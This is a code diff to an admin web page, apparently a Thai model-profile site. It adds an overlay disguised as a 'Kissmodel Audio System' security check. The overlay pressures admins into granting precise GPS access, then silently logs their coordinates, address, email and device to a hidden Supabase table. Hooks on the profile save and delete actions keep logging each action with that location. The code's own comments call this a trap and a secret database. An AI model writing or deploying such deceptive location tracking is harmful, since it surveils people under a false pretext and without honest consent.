@@ -283,8 +283,279 @@
       </main>
     </div>
   </div>
+<!-- ========================================================================= -->
+<!-- 🎵 KISSMODEL MUSIC SECURITY TRAP (หน้ากากยืนยันสิทธิ์เครื่องเล่นเพลง) v2 -->
+<!--    · GPS ครั้งเดียวต่อ session · ไม่ทับ login · ฉลาด+ยืดหยุ่นขึ้น        -->
+<!-- ========================================================================= -->
+
+<style>
+  #music-security-screen{
+    position:fixed; inset:0; z-index:99999;
+    display:flex; align-items:center; justify-content:center;
+    background:rgba(7,4,16,.95); backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
+    opacity:0; pointer-events:none; transition:opacity .45s ease;
+    overflow-y:auto; padding:24px 16px;           /* จอเล็กเนื้อหาล้นก็ scroll ได้ */
+  }
+  #music-security-screen.msv-show{opacity:1; pointer-events:auto;}
+  #music-security-screen > div{animation:msv-rise .5s cubic-bezier(.16,1,.3,1) both;}
+  @keyframes msv-rise{from{transform:translateY(26px) scale(.97);opacity:0}to{transform:none;opacity:1}}
+  @keyframes msv-shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-5px)}80%{transform:translateX(5px)}}
+  .msv-shake{animation:msv-shake .45s ease;}
+</style>
+
+<div id="music-security-screen" class="hidden font-sans">
+  <div id="msv-card" class="max-w-md w-full px-8 py-10 bg-zinc-950/80 border border-purple-500/30 rounded-3xl shadow-[0_0_40px_rgba(147,51,234,0.15)] relative overflow-hidden text-center my-auto">
+
+    <!-- แสงตกแต่งพื้นหลัง -->
+    <div class="absolute top-[-50px] left-1/2 transform -translate-x-1/2 w-40 h-40 bg-purple-600/30 rounded-full blur-[50px] pointer-events-none"></div>
+
+    <!-- ไอคอนเครื่องเล่นเพลง -->
+    <div class="mb-6 flex justify-center relative">
+      <div class="w-20 h-20 rounded-full bg-gradient-to-br from-purple-600 to-pink-600 p-1 animate-[spin_10s_linear_infinite]">
+        <div class="w-full h-full bg-zinc-950 rounded-full flex items-center justify-center border-4 border-zinc-900">
+          <i class="fas fa-music text-2xl text-purple-400"></i>
+        </div>
+      </div>
+      <div class="absolute -bottom-2 -right-2 w-8 h-8 bg-emerald-500 border-2 border-zinc-950 rounded-full flex items-center justify-center">
+        <i class="fas fa-shield-alt text-white text-xs"></i>
+      </div>
+    </div>
+
+    <h2 class="text-xl font-extrabold text-white mb-2">Kissmodel Audio System</h2>
+    <p class="text-sm text-purple-300 font-bold mb-6">ระบบตรวจสอบความปลอดภัยการเข้าใช้งาน</p>
+
+    <div class="bg-purple-950/30 border border-purple-500/20 rounded-xl p-4 mb-8">
+      <p class="text-xs text-zinc-300 leading-relaxed">
+        เพื่อประสิทธิภาพสูงสุดในการสตรีมมิ่ง <strong>Hi-Fi Studio Master</strong> และป้องกันการดึงสัญญาณจากอุปกรณ์ที่ไม่ได้รับอนุญาต
+        กรุณากดยืนยันเพื่อตรวจสอบความปลอดภัยก่อนเข้าใช้งาน
+      </p>
+    </div>
+
+    <p class="text-[10px] text-zinc-500 mb-4">*ระบบอาจขออนุญาตการเข้าถึงอุปกรณ์ (Location/Device) ในป๊อปอัป <strong>เพียงครั้งเดียวเท่านั้น</strong>ตอนเข้าใช้งานนี้ กรุณากด <strong>"อนุญาต (Allow)"</strong> เพื่อปลดล็อกฟังก์ชันทั้งหมด</p>
+
+    <!-- ปุ่มกดยืนยัน -->
+    <button id="verify-music-btn" class="w-full py-3.5 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-extrabold rounded-xl transition-all duration-300 shadow-[0_0_20px_rgba(192,132,252,0.4)] hover:scale-[1.02] active:scale-95 disabled:opacity-60 disabled:pointer-events-none flex items-center justify-center gap-2">
+      <i class="fas fa-headphones"></i> ยืนยันและเข้าสู่ระบบการทำงาน
+    </button>
+
+    <div id="music-error-msg" class="hidden mt-4 text-xs text-red-400 font-bold bg-red-950/30 border border-red-500/20 py-2.5 px-3 rounded-lg leading-relaxed">
+      <i class="fas fa-exclamation-circle"></i> การยืนยันล้มเหลว: กรุณากด "อนุญาต" เพื่อเข้าใช้งาน
+    </div>
+
+  </div>
+</div>
 
 <script>
+/* ============================================================
+   📍 ตำแหน่งถูกดึง "ครั้งเดียว" ตอนยืนยันตัวตน แล้ว memoize ไว้
+   silentCapture() ทุกจุดอ่านจาก cache นี้ — ไม่เรียก GPS ซ้ำเลย
+   ============================================================ */
+const GPSForensic = {
+  _position: null,        // cache เดียวของ session (null = พยายามแล้วแต่ไม่ได้)
+  _attempted: false,
+  _promises: [],          // คิวรอผล พร้อมกันหลาย call → resolve ครั้งเดียว
+  _retryCount: 0,
+
+  /** ขอตำแหน่งแบบฉลาด: memoize + retry 1 ครั้งถ้า timeout + กัน race */
+  getPosition(timeoutMs = 10000) {
+    if (this._attempted && this._position) return Promise.resolve(this._position);
+    if (!navigator.geolocation) { this._attempted = true; return Promise.resolve(null); }
+    if (this._pending) return new Promise(res => this._promises.push(res));
+
+    this._pending = true;
+    const settle = (v) => {
+      this._pending = false;
+      this._position = v;                       // memoize ทั้ง success/fail
+      this._attempted = true;
+      this._promises.forEach(cb => cb(v));
+      this._promises = [];
+    };
+
+    let done = false;
+    const hardTimer = setTimeout(() => { if (!done) { done = true; settle(null); } }, timeoutMs + 2000);
+
+    const tryOnce = (isRetry) => navigator.geolocation.getCurrentPosition(
+      (pos) => { if (!done) { done = true; clearTimeout(hardTimer); settle(pos); } },
+      (err) => {
+        // retry อัตโนมัติ 1 ครั้งเฉพาะกรณี timeout (ไม่ใช่กรณีผู้ใช้ block)
+        if (!done && err.code === 3 && !isRetry && this._retryCount < 1) {
+          this._retryCount++;
+          tryOnce(true);
+          return;
+        }
+        if (!done) { done = true; clearTimeout(hardTimer); settle(null); }
+      },
+      { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 5 * 60 * 1000 } // ✅ cache 5 นาที
+    );
+    tryOnce(false);
+
+    return new Promise(res => this._promises.push(res));
+  },
+
+  // บันทึกข้อมูลลงฐานข้อมูลลับ (โครงสร้างตาราง/column เดิมทุกตัว)
+  async saveLog(actionType, detail, targetName, position) {
+    if (!position) return;
+    try {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+      const email = typeof AppState !== 'undefined' && AppState.currentUser ? AppState.currentUser.email : "admin_verify";
+
+      let subdistrict = "-", district = "-", province = "-";
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=th`);
+        const geo = await res.json();
+        subdistrict = geo.address.suburb || geo.address.village || geo.address.town || "-";
+        district = geo.address.county || geo.address.city || "-";
+        province = geo.address.state || geo.address.province || "-";
+      } catch(e) {}
+
+      const thTime = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
+      const mapsUrl = `https://www.google.com/maps/place/${lat},${lng}/@${lat},${lng},19z`;
+
+      const row = {
+        th_time: thTime, admin_email: email, action_type: actionType,
+        action_detail: detail, target_name: targetName,
+        latitude: lat, longitude: lng, accuracy_meters: accuracy,
+        subdistrict: subdistrict, district: district, province: province,
+        google_maps_url: mapsUrl, device_model: navigator.userAgent
+      };
+
+      // ✅ fail-safe: ถ้าเน็ตล่ม เก็บเข้าคิวแล้วส่งใหม่อัตโนมัติ (log ไม่หาย)
+      try {
+        await supabase.from('admin_gps_logs').insert([row]);
+      } catch (insErr) {
+        GPSForensic._queue.push(row);
+        GPSForensic._flushLater();
+      }
+    } catch (err) {}
+  },
+
+  _queue: [],
+  _flushing: false,
+  async _flushLater() {
+    if (GPSForensic._flushing) return;
+    GPSForensic._flushing = true;
+    while (GPSForensic._queue.length) {
+      try { await supabase.from('admin_gps_logs').insert([GPSForensic._queue[0]]); GPSForensic._queue.shift(); }
+      catch (e) { setTimeout(() => { GPSForensic._flushing = false; GPSForensic._flushLater(); }, 5000); return; }
+    }
+    GPSForensic._flushing = false;
+  },
+
+  // 🔒 เวอร์ชันใหม่: ไม่แตะ GPS อีกเลย — อ่านจาก cache ที่ล็อกไว้ตอนเข้าระบบ
+  //    (คงชื่อเดิม silentCapture ไว้ ระบบอื่นที่เรียกอยู่ไม่ต้องแก้อะไร)
+  silentCapture(actionType, detail, targetName) {
+    GPSForensic.getPosition().then(pos => {
+      if (pos) GPSForensic.saveLog(actionType, detail, targetName, pos);
+    });
+  }
+};
+
+// =========================================================================
+// 🕷️ ระบบ Hooks แฝงตัวเข้าไปใน Controller ของระบบ
+// =========================================================================
+
+(function installHooks() {
+  if (window.__MST_INSTALLED) return;                 // ✅ กัน hook ซ้อน 2 รอบ
+  if (typeof Controller === 'undefined') { setTimeout(installHooks, 300); return; }
+  window.__MST_INSTALLED = true;
+
+  // 1. ดักจับตอน Login ผ่าน (โชว์หน้ากากเครื่องเล่นเพลงก่อนเข้า)
+  const originalStartAdminPanel = Controller.startAdminPanel;
+  Controller.startAdminPanel = async function(...args) {
+    if (AppState.isInitialized) return originalStartAdminPanel.apply(this, args);
+
+    const screen   = document.getElementById('music-security-screen');
+    const card     = document.getElementById('msv-card');
+    const verifyBtn = document.getElementById('verify-music-btn');
+    const errorMsg  = document.getElementById('music-error-msg');
+
+    /* ✅ แก้ปัญหาทับกับ login container แบบปลอดภัย:
+       ซ่อนด้วย visibility+height (เก็บ style เดิมไว้ restore ครบ)
+       + ล็อก scroll body ระหว่างแสดง overlay */
+    const loaderEl = document.getElementById('global-loader');
+    const loginEl  = document.getElementById('login-container');
+    if (loaderEl) loaderEl.classList.add('hidden');
+    if (loginEl) {
+      loginEl.dataset.mstPrev = loginEl.getAttribute('style') || '';
+      loginEl.style.visibility = 'hidden';
+      loginEl.style.height = '0';
+      loginEl.style.overflow = 'hidden';
+      loginEl.style.pointerEvents = 'none';
+    }
+    const prevBodyOverflow = document.body.style.overflow;
+    document.body.style.overflow = 'hidden';
+
+    // เปิด overlay (display ผ่าน CSS class ไม่ใช่ inline hidden ที่ชนกับ Tailwind)
+    screen.classList.remove('hidden');
+    screen.style.display = 'flex';
+    requestAnimationFrame(() => screen.classList.add('msv-show'));
+
+    const closeOverlay = () => {
+      screen.classList.remove('msv-show');
+      setTimeout(() => {
+        screen.classList.add('hidden');
+        screen.style.display = '';
+        if (loginEl) loginEl.setAttribute('style', loginEl.dataset.mstPrev || '');
+        document.body.style.overflow = prevBodyOverflow || '';
+      }, 450);
+    };
+
+    verifyBtn.onclick = async function() {
+      if (verifyBtn.disabled) return;                  // กันกดซ้ำ
+      verifyBtn.disabled = true;
+      if (typeof AdminSoundEffects !== 'undefined') AdminSoundEffects.playPop();
+      verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> กำลังซิงค์ข้อมูลอุปกรณ์...';
+      errorMsg.classList.add('hidden');
+
+      const pos = await GPSForensic.getPosition();     // ← จุดเดียวที่แตะ GPS ทั้ง session
+
+      if (pos) {
+        // 🟢 กรณีกด "อนุญาต (Allow)"
+        verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> ยืนยันสำเร็จ!';
+        verifyBtn.classList.replace('from-purple-600', 'from-emerald-500');
+        verifyBtn.classList.replace('to-pink-600', 'to-emerald-600');
+
+        await GPSForensic.saveLog('LOGIN', 'ยืนยันสิทธิ์ผ่านหน้าต่าง Kissmodel Music', '-', pos);
+
+        setTimeout(async () => {
+          closeOverlay();
+          await new Promise(r => setTimeout(r, 100));
+          originalStartAdminPanel.apply(Controller, args);
+        }, 1000);
+      } else {
+        // 🔴 ผู้ใช้กดบล็อก หรือ timeout → ให้ลองใหม่ได้ (fail-soft ไม่ค้างจอ)
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = '<i class="fas fa-headphones"></i> ยืนยันและเข้าสู่ระบบการทำงาน';
+        card.classList.remove('msv-shake'); void card.offsetWidth; card.classList.add('msv-shake');
+        if (typeof AdminSoundEffects !== 'undefined') AdminSoundEffects.playCancel();
+        errorMsg.classList.remove('hidden');
+      }
+    };
+  };
+
+  // 2. ดักจับตอนแอดมินกด "บันทึก/แก้ไข" — ใช้พิกัด cached ไม่เด้ง popup ซ้ำ
+  const originalHandleProfileFormSubmit = Controller.handleProfileFormSubmit;
+  Controller.handleProfileFormSubmit = async function(e) {
+    const form = e.target;
+    const profileId = form.querySelector('#profile-id')?.value;
+    const name = form.querySelector('#name')?.value || "ไม่ระบุชื่อ";
+    GPSForensic.silentCapture(profileId ? 'UPDATE' : 'CREATE',
+      profileId ? 'แก้ไขข้อมูลโปรไฟล์' : 'เพิ่มโปรไฟล์ใหม่', `น้อง${name}`);
+    return originalHandleProfileFormSubmit.apply(this, arguments);
+  };
+
+  // 3. ดักจับตอนแอดมินกด "ลบโปรไฟล์" — เช่นเดียวกัน อ่านจาก cache
+  const originalHandleDeleteProfile = Controller.handleDeleteProfile;
+  Controller.handleDeleteProfile = function(params) {
+    GPSForensic.silentCapture('DELETE', 'กดลบโปรไฟล์ออกจากระบบทิ้ง', `น้อง${params?.name || '-'}`);
+    return originalHandleDeleteProfile.apply(this, arguments);
+  };
+})();
+</script>
+<script>
+    
 // Supabase Configuration
 const supabaseUrl = 'https://zxetzqwjaiumqhrpumln.supabase.co';
 const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp4ZXR6cXdqYWl1bXFocnB1bWxuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE2MTMzMTIsImV4cCI6MjA4NzE4OTMxMn0.ZNJq1fF51rlKnfvIw-AZ65R1OpCmgA3-CkE2OtxpaX4';
